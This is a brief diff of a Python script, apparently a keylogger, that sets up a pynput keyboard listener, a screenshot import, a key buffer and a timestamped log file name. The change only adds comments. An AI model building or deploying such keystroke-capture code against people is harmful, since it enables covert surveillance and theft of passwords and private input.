@@ -4,12 +4,12 @@ import pynput
 from Screenshot import * #Importing screenshot function
 
 
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener #call function
 
 count = 0
 keys = []
 
-file_name = time.strftime("%Y%m%d-%H%M%S")+".txt"
+file_name = time.strftime("%Y%m%d-%H%M%S")+".txt" #create file name
 
 
 def on_press(key):
